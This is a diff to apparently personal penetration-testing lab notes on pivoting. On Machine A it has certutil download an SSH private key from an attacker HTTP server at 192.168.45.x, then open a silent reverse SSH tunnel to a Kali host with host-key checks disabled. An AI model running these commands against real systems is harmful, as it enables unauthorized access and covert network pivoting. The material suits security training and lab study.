@@ -50,17 +50,13 @@ sudo systemctl start ssh
 ```
 
 (Machine A, interactive)
-```bash
-ssh -N -R 9997 kali@$ip_kali
+```powershell
+certutil.exe -urlcache -split -f "http://192.168.45.195:8000/id_rsa_kali"; ssh -i id_rsa_kali -N -R 9997 kali@192.168.45.195
 ```
 or
 (Machine A, non-interactive)
 ```powershell
-certutil.exe -urlcache -split -f "http://192.168.45.182:8000/id_rsa_kali"
-```
-Then, run the following on it:
-```bash
-ssh -f -q -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -i id_rsa_kali -N -R 9997 kali@$hip
+certutil.exe -urlcache -split -f "http://192.168.45.182:8000/id_rsa_kali"; ssh -f -q -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -i id_rsa_kali -N -R 9997 kali@$hip
 ```
 
 (kali machine)
